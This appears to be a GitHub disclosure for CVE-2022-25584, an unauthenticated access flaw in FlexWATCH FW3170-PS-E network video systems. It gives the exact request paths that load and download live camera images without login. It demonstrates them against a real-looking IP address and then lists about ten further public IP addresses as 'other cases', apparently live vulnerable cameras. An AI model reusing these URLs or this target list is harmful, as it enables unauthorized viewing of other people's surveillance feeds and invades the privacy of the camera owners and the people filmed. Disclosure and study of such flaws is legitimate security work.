# Flexwatch

Flexwatch-CVE

This document is for CVE-2022-25584   "RESERVED" 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25584

![image](https://user-images.githubusercontent.com/102948391/161503085-b2d21191-216f-4ea5-8e69-45efd0bbd134.png)

This vulnerability has been indexed by CNVD, but has not yet been made public

CNVD ID:CNVD-2021-103443

![image](https://user-images.githubusercontent.com/102948391/161504052-6e96866b-01f9-4d84-b770-6a0b7d83f021.png)


Vulnerability to reproduce:

We found that the FlexWATCH FW3170-PS-E Network Video System 4.23-3000_GY owned by Seyeon Tech Co., Ltd. has an unauthenticated access vulnerability, which can be exploited by attackers to obtain monitoring images and leak sensitive information

For example:

http://211.174.227.102:10001/app/multi/single.asp

![image](https://user-images.githubusercontent.com/102948391/161505458-256b4f7a-b4de-46c8-ae76-2fdb9f545da4.png)

Then,we can visit:http://211.174.227.102:10001/cgi-bin/fwcamimgsave.cgi?FwModId=0&PortId=0&FwCgiVer=0x0001

Download monitoring real-time screen

![image](https://user-images.githubusercontent.com/102948391/161505912-208a6dae-05c9-4b91-a6cd-bf143de712c9.png)

![image](https://user-images.githubusercontent.com/102948391/161506260-1392190f-4cbb-4c74-89e3-567ce2ef5f06.png)

Company official website:http://www.flexwatch.com/

Other cases:

http://211.240.10.38:10001/app/multi/single.asp

http://121.133.21.35:10001/app/multi/single.asp

http://210.223.145.159:10001/app/multi/single.asp

http://115.142.194.178:10001/app/multi/single.asp

http://115.142.194.178:10001/app/multi/single.asp

http://27.1.124.18:10001/app/multi/single.asp

http://183.100.61.196:10001/app/multi/single.asp

http://118.176.196.247:10001/app/multi/single.asp

http://211.36.62.253:10001/app/multi/single.asp

http://211.174.227.230:10001/app/multi/single.asp



